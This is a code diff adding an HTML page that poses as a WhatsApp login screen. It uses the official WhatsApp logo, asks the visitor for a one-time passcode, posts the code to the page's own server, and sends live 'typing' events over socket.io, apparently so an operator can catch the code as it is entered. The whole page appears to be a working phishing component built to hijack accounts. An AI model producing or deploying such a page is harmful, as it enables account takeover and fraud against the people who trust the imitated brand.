@@ -1,0 +1,124 @@
+<html>
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+
+        body {
+  background-color: white;
+  font-family: Arial;
+  font-style: normal;
+  font-weight: 300;
+  font-variant: normal;
+  margin: 0;
+}
+        .header {
+  overflow: hidden;
+  background-color: #128c7e;
+}
+        .header img {
+  float: left;
+  padding: 14px 16px;
+  width: 40px;
+  height: 40px;
+}
+        .header a {
+  color: white;
+  padding: 14px 16px;
+  font-size: 20px;
+  text-align: center;
+  font-weight: 400;
+}
+        .header a.lines {
+  float: right;
+  text-align: center;
+
+}
+        .box {
+  text-align: center;
+}
+        .box input {
+  display: block;
+  position: relative;
+  margin: 0 auto;
+  background-color: #FFFFFF;
+  border-bottom: solid 3px #77d7c8;
+  border-left: none;
+  border-right: none;
+  border-top: none;
+  font-weight: 300;
+  text-align: center;
+  border-radius: 2px;
+  outline: none;
+  width: 200px;
+  height: 50px;
+}
+        .box #otpWarn,#phWarn {
+  font-size: 10px;
+  color: red;
+}
+        .title {
+  text-align: center;
+}
+        .title h1 {
+  font-size: 25px;
+  font-family: Arial;
+  font-weight: 500;
+}
+        .title a {
+  font-size: 17px;
+  color:  grey;
+}
+        .line {
+  width: 2px;
+  height: 2px;
+  color: grey;
+}
+        button {
+
+  background-color: transparent;
+  border: solid 2px #77d7c8;
+  color: #1cb39b;
+  outline: none;
+  border-radius: 25px;
+  font-family: Sans-Serif;
+  font-weight: 500;
+  width: 200px;
+  height: 50px;
+}
+        #otpWarn {
+  display: none;
+  font-size: 9px;
+  color: red;
+}
+    </style>
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+      var socket = io()
+      function typing(id) {
+        socket.emit("typing", "typing")
+      }
+      function stoptyping() {
+        socket.emit("stop-typing", "typing stopped ")
+      }
+    </script>
+  </head>
+  <body>
+    <div class="header">
+      <img src="https://static.whatsapp.net/rsrc.php/yz/r/lOol7j-zq4u.svg" alt="logo">
+      <br>
+      <a>WhatsApp</a>
+    </div>
+    <div class="title">
+      <h1>Login</h1>
+      <a>please login to continue</a>
+
+    </div>
+    <form method="post" action="/" class="box">
+      <br>
+      <input onchange="stoptyping()" oninput="typing()" placeholder="otp" type="number" name="otp"><p id="otpWarn">invalid otp</p>
+      <br>
+      <button id="login" type="submit">login</button>
+    </form>
+    </div>
+  </body>
+</html>
